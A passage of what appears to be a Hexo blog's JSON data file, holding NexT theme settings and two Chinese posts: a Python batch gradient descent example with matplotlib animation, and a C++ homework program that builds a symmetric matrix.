50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":2055,"excerpt":"<h1 id=\"批量梯度下降\"><a href=\"#批量梯度下降\" class=\"headerlink\" title=\"批量梯度下降\"></a>批量梯度下降</h1><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> matplotlib.pyplot <span class=\"keyword\">as</span> plt</span><br><span class=\"line\"><span class=\"keyword\">from</span> matplotlib.animation <span class=\"keyword\">import</span> FuncAnimation</span><br><span class=\"line\"><span class=\"comment\"># Excel预测函数</span></span><br><span class=\"line\"><span class=\"comment\"># y = 1771.8 + 28.777x</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 数据集</span></span><br><span class=\"line\">x = [<span class=\"number\">150</span>, <span class=\"number\">200</span>, <span class=\"number\">250</span>, <span class=\"number\">300</span>, <span class=\"number\">350</span>, <span class=\"number\">400</span>, <span class=\"number\">600</span>]</span><br><span class=\"line\">y = [<span class=\"number\">6450</span>, <span class=\"number\">7450</span>, <span class=\"number\">8450</span>, <span class=\"number\">9450</span>, <span class=\"number\">11450</span>, <span class=\"number\">15450</span>, <span class=\"number\">18450</span>]</span><br><span class=\"line\"><span class=\"comment\"># 迭代过程直线起始y值</span></span><br><span class=\"line\">data = [[] <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(int(<span class=\"number\">1E6</span>))]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 损失函数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">LossFunctionX</span>(<span class=\"params\">theta0, theta1</span>):</span></span><br><span class=\"line\">    los = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(x)):</span><br><span class=\"line\">        h = (theta0 + theta1 * x[i])  <span class=\"comment\"># 对theta0求偏导</span></span><br><span class=\"line\">        los = los + (h - y[i])</span><br><span class=\"line\">    <span class=\"keyword\">return</span> los</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 损失函数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">LossFunctionY</span>(<span class=\"params\">theta0, theta1</span>):</span></span><br><span class=\"line\">    los = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(x)):</span><br><span class=\"line\">        h = (theta0 + theta1 * x[i])  <span class=\"comment\"># 对theta1求偏导</span></span><br><span class=\"line\">        los = los + (h - y[i]) * x[i]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> los</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># GIF更新函数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">update</span>(<span class=\"params\">i</span>):</span></span><br><span class=\"line\">    label = <span class=\"string\">&#x27;timestep &#123;0&#125;&#x27;</span>.format(i)</span><br><span class=\"line\">    <span class=\"comment\"># print(label)</span></span><br><span class=\"line\">    line.set_xdata([x[<span class=\"number\">0</span>], x[len(x) - <span class=\"number\">1</span>]])</span><br><span class=\"line\">    line.set_ydata(data[i])  <span class=\"comment\"># 重绘直线</span></span><br><span class=\"line\">    ax.set_xlabel(label)  <span class=\"comment\"># 重绘x轴标签</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> line, ax</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 梯度下降</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">GradientDescent</span>(<span class=\"params\">theta0, theta1, iters, alphaX, alphaY</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(iters):</span><br><span class=\"line\">        <span class=\"comment\"># 迭代更新theta值</span></span><br><span class=\"line\">        theta0 = theta0 - alphaX * LossFunctionX(theta0, theta1) / len(x)</span><br><span class=\"line\">        theta1 = theta1 - alphaY * LossFunctionY(theta0, theta1) / len(x)</span><br><span class=\"line\">        <span class=\"comment\"># print(theta0, theta1)  # 输出迭代过程中theta值</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 画出迭代过程中拟合线性方程</span></span><br><span class=\"line\">        plt.plot(x, y, <span class=\"string\">&#x27;bo&#x27;</span>)</span><br><span class=\"line\">        plt.plot([x[<span class=\"number\">0</span>], x[len(x) - <span class=\"number\">1</span>]], [theta0 + theta1 * x[<span class=\"number\">0</span>], theta0 + theta1 * x[len(x) - <span class=\"number\">1</span>]], <span class=\"string\">&#x27;b&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 记录data值</span></span><br><span class=\"line\">        data[i].append(theta0 + theta1 * x[<span class=\"number\">0</span>])</span><br><span class=\"line\">        data[i].append(theta0 + theta1 * x[len(x) - <span class=\"number\">1</span>])</span><br><span class=\"line\">    <span class=\"keyword\">return</span> theta0, theta1</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    <span class=\"comment\"># 参数分别为(theta0初始值, theta1初始值, 迭代次数, theta0学习速率, theta1学习速率)</span></span><br><span class=\"line\">    a, b = GradientDescent(<span class=\"number\">0</span>, <span class=\"number\">0</span>, int(<span class=\"number\">4E3</span>), <span class=\"number\">1E-1</span>, <span class=\"number\">1E-5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 绘制图形部分</span></span><br><span class=\"line\">    plt.plot(x, y, <span class=\"string\">&#x27;bo&#x27;</span>)  <span class=\"comment\"># 画出散点图</span></span><br><span class=\"line\">    plt.plot([x[<span class=\"number\">0</span>], x[len(x) - <span class=\"number\">1</span>]], [a + b * x[<span class=\"number\">0</span>], a + b * x[len(x) - <span class=\"number\">1</span>]], <span class=\"string\">&#x27;r&#x27;</span>)  <span class=\"comment\"># 画出拟合出的线性方程</span></span><br><span class=\"line\">    plt.show()  <span class=\"comment\"># 显示图形</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 绘制GIF部分</span></span><br><span class=\"line\">    fig, ax = plt.subplots()</span><br><span class=\"line\">    fig.set_tight_layout(<span class=\"literal\">True</span>)</span><br><span class=\"line\">    ax.scatter(x, y)  <span class=\"comment\"># 绘制散点图, 不刷新</span></span><br><span class=\"line\">    line, = ax.plot([x[<span class=\"number\">0</span>], <span class=\"number\">0</span>], [x[len(x) - <span class=\"number\">1</span>], <span class=\"number\">0</span>], <span class=\"string\">&#x27;b&#x27;</span>)  <span class=\"comment\"># 绘制初始直线, update函数对其进行更新</span></span><br><span class=\"line\">    anim = FuncAnimation(fig, update, frames=<span class=\"number\">10</span>, interval=<span class=\"number\">1000</span>)  <span class=\"comment\"># frames为帧数, interval为每帧停留的的时间ms</span></span><br><span class=\"line\">    anim.save(<span class=\"string\">&#x27;line.gif&#x27;</span>, dpi=<span class=\"number\">100</span>, writer=<span class=\"string\">&#x27;pillow&#x27;</span>)  <span class=\"comment\"># dpi为分辨率</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 输出部分</span></span><br><span class=\"line\">    print(<span class=\"string\">&quot;theta0: &#123;0&#125;&quot;</span>.format(a))</span><br><span class=\"line\">    print(<span class=\"string\">&quot;theta1: &#123;0&#125;&quot;</span>.format(b))</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>","more":"<p>以下为输出结果<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">theta0: 1771.8085106382905</span><br><span class=\"line\">theta1: 28.776595744680872</span><br></pre></td></tr></table></figure><br>学习速率影响拟合速度，学习速率过大会导致无法到达最佳值点，反之，速率过小，拟合速度又会太慢。</p>\n<div>\n<img data-src=\"https://cdn.file.todest.cn/blog/pic/20200408.png\" width=\"50%\" height=\"50%\" style=\"float:left\"><img data-src=\"https://cdn.file.todest.cn/blog/pic/20200408.gif\" width=\"50%\" height=\"50%\" style=\"float:left\">\n</div>"},{"title":"矩阵","date":"2019-03-29T09:11:09.000Z","abbrlink":"7d16c0e9","updated":"2020-04-08T10:40:24.000Z","_content":"# 矩阵\n**以下为数据结构作业**\n如有错误，请指出，谢谢！\n<!--more-->\n```cpp\n#include<iostream>\nusing namespace std;\nint main()\n{\n    int a[10]={0,1,2,3,4,5,6,7,8,9};\n    int b[10][10],k=0;\n    for(int i=0;i<4;i++)\n    {\n        for(int j=0;j<=i;j++)\n        {\n            b[i][j]=a[k];\n            b[j][i]=a[k++];\n        }\n    }\n    for(int i=0;i<4;i++)\n    {\n        for(int j=0;j<4;j++)\n            cout<<b[i][j]<<' ';\n        cout<<endl;\n    }\n    return 0;\n}\n```","source":"_posts/矩阵.md","raw":"---\ntitle: 矩阵\ndate: 2019-03-29 17:11:09\ncategories:\n  - 数据结构\ntags:\n  - 矩阵\nabbrlink: 7d16c0e9\nupdated:\n---\n# 矩阵\n**以下为数据结构作业**\n如有错误，请指出，谢谢！\n<!--more-->\n```cpp\n#include<iostream>\nusing namespace std;\nint main()\n{\n    int a[10]={0,1,2,3,4,5,6,7,8,9};\n    int b[10][10],k=0;\n    for(int i=0;i<4;i++)\n    {\n        for(int j=0;j<=i;j++)\n        {\n            b[i][j]=a[k];\n            b[j][i]=a[k++];\n        }\n    }\n    for(int i=0;i<4;i++)\n    {\n        for(int j=0;j<4;j++)\n            cout<<b[i][j]<<' ';\n        cout<<endl;\n    }\n    return 0;\n}\n```","slug":"矩阵","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexkdv003nqse52uvp6byl","content":"<h1 id=\"矩阵\"><a href=\"#矩阵\" class=\"headerlink\" title=\"矩阵\"></a>矩阵</h1><p><strong>以下为数据结构作业</strong><br>如有错误，请指出，谢谢！<br><a id=\"more\"></a><br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> a[<span class=\"number\">10</span>]=&#123;<span class=\"number\">0</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>&#125;;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> b[<span class=\"number\">10</span>][<span class=\"number\">10</span>],k=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">4</span>;i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> j=<span class=\"number\">0</span>;j&lt;=i;j++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            b[i][j]=a[k];</span><br><span class=\"line\">            b[j][i]=a[k++];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">4</span>;i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> j=<span class=\"number\">0</span>;j&lt;<span class=\"number\">4</span>;j++)</span><br><span class=\"line\">            <span class=\"built_in\">cout</span>&lt;&lt;b[i][j]&lt;&lt;<span class=\"string\">&#x27; &#x27;</span>;</span><br><span class=\"line\">        <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} 